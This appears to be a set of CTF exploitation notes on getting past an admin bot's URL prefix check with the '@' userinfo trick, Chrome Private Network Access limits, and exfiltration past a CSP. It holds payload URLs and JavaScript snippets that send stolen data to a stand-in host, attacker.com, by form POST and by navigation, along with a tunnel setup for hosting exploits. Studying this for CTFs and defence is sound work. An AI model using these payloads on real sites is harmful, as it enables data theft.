# Bot URL Validation Bypass via Userinfo (@) + Chrome PNA Constraints

## URL Userinfo (@) Bypass

**Pattern:** Bot validates user-supplied URL with a prefix check like `url.startswith("http://127.0.0.1:7000")`. The URL spec allows userinfo before the host: `http://user:pass@host/path`. Browsers interpret the part after `@` as the actual host.

**Exploit:**
```
http://127.0.0.1:7000@attacker.com/exploit.html
```
- Python `str.startswith("http://127.0.0.1:7000")` → True ✓
- Browser navigates to → `attacker.com/exploit.html`

**Variations:**
```
http://127.0.0.1:7000@attacker.com/path       → attacker.com (basic)
http://127.0.0.1:7000@127.0.0.1:7001/status   → 127.0.0.1:7001 (port hop)
http://127.0.0.1:7000@127.0.0.1:8765/exploit  → local service on different port
```

**Detection:** Bot accepts URL input + error messages from Selenium/Playwright ("invalid argument" = webdriver). Placeholder hints like `http://127.0.0.1:PORT/...` confirm the prefix check.

**Confirmation:** Submit `http://127.0.0.1:PORT@<invalid-host>` — if bot returns "Bot failed: invalid argument" instead of "URL must start with...", the prefix check passed but navigation failed = bypass confirmed.

---

## Chrome Private Network Access (PNA) Blocking

When the exploit page is served from a **public** origin (e.g., cloudflare tunnel HTTPS), Chrome 94+ blocks fetches to private/loopback IPs regardless of CORS headers.

**Blocked patterns (public → private):**
- `https://attacker.trycloudflare.com` → `fetch("http://127.0.0.1:7001/...")` → TypeError: Failed to fetch
- `https://ngrok.io/...` → `fetch("http://10.0.0.1/...")` → blocked
- HTTP public pages → private IPs: also blocked in Chrome 130+

**Allowed patterns (private → private):**
- `http://127.0.0.1:7000` → `fetch("http://127.0.0.1:7001/...")` → allowed (loopback → loopback)
- `http://192.168.1.5` → `fetch("http://192.168.1.10/...")` → allowed (private → private)

**Key insight:** PNA blocks based on the **IP address space of the document's origin**, not the machine running the browser. Even if the bot machine CAN reach 127.0.0.1:7001, a page loaded from a public IP cannot fetch it.

**Implication for CTF:** You MUST get code execution in the private/loopback context (XSS on a page served from 127.0.0.1) to fetch other local services. External exploit pages can only exfiltrate data that doesn't require cross-address-space fetch.

---

## CSP Exfiltration Constraints

When you have `script-src 'unsafe-inline'` but `default-src 'none'` (meaning connect-src, img-src, etc. fall to 'none'):

**Blocked:**
- `fetch()` / `XMLHttpRequest` (connect-src 'none')
- `new Image().src = "..."` (img-src 'none')
- `<link rel=...>` prefetch (default-src 'none')
- WebSocket connections (connect-src 'none')

**NOT blocked by CSP:**
- `window.location = "..."` (top-level navigation)
- `window.open("...")`
- `<form>.submit()` to arbitrary action URL (form-action not set = unrestricted)
- `<a href="..." target="_blank">.click()`
- DNS prefetch (browser-dependent)

**Exfiltration via form POST (CSP bypass):**
```javascript
// Works even with connect-src 'none' when form-action is not in CSP
var f = document.createElement('form');
f.method = 'POST';
f.action = 'https://attacker.com/exfil';
var i = document.createElement('input');
i.name = 'data';
i.value = stolenData;
f.appendChild(i);
document.body.appendChild(f);
f.submit();
```

**Exfiltration via navigation (read-then-redirect):**
```javascript
// If you can read the data from same-origin first, then navigate out
var data = document.getElementById('flag').textContent;
window.location = 'https://attacker.com/exfil?d=' + encodeURIComponent(data);
```

---

## Combined Attack Strategies (Bot + Internal Service + Flag on Different Port)

**Scenario:** Flag is on `127.0.0.1:PORT_B/status`, bot runs on same machine, bot URL validated to `http://127.0.0.1:PORT_A/...`

**Strategy A — XSS on PORT_A page (best):**
1. Find injection point on PORT_A that renders without sanitization
2. CSP must allow the exfil method you need
3. From PORT_A context, fetch PORT_B is private→private (PNA allowed)
4. But still cross-origin (different port) — needs CORS on PORT_B or same-origin trick

**Strategy B — @ bypass to PORT_B directly:**
1. `http://127.0.0.1:PORT_A@127.0.0.1:PORT_B/status?xss=<payload>`
2. If PORT_B reflects query params + has `script-src 'unsafe-inline'`, XSS fires in PORT_B context
3. From PORT_B origin, read same-origin page content, exfil via navigation/form

**Strategy C — @ bypass to attacker + no-PNA method:**
1. Navigate bot to external page (@ bypass)
2. Cannot fetch private IPs (PNA blocks it)
3. Use `window.open` / navigation to PORT_B, but cannot read cross-origin response
4. Only viable if PORT_B itself leaks data via URL fragment, error messages, or timing

**Strategy D — Redirect chain:**
1. If PORT_A has an open redirect (e.g., `/login?next=http://127.0.0.1:PORT_B/status`)
2. Bot follows redirect to PORT_B, page renders in PORT_B context
3. Combine with XSS on PORT_B if available

**Strategy E — Ticket/content injection into PORT_B:**
1. If the app has a mechanism that publishes user content TO the status/internal service
2. Inject XSS payload via that mechanism (e.g., escalated ticket body appears on status page)
3. When bot (or admin) views the status page, XSS fires in PORT_B context

---

## Cloudflare Tunnel Setup for Exploit Hosting

```bash
# Start local server
python3 -c "
from http.server import BaseHTTPRequestHandler, HTTPServer
LOGFILE = '/tmp/hits.log'
import time
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        with open(LOGFILE,'a') as f: f.write('[%s] GET %s\n'%(time.strftime('%H:%M:%S'),self.path))
        self.send_response(200)
        self.send_header('Content-Type','text/html')
        self.send_header('Access-Control-Allow-Origin','*')
        self.end_headers()
        # Serve exploit or just log
        self.wfile.write(b'OK')
HTTPServer(('0.0.0.0',8765),H).serve_forever()
" &

# Cloudflare tunnel (no signup needed, no interstitial unlike ngrok free)
cloudflared tunnel --url http://localhost:8765
# Grab the URL from output: https://random-words.trycloudflare.com
```

**Prefer cloudflared over ngrok** for CTF exploit hosting — no auth required, no interstitial warning page that blocks bot headless browsers, direct HTTPS with valid cert.
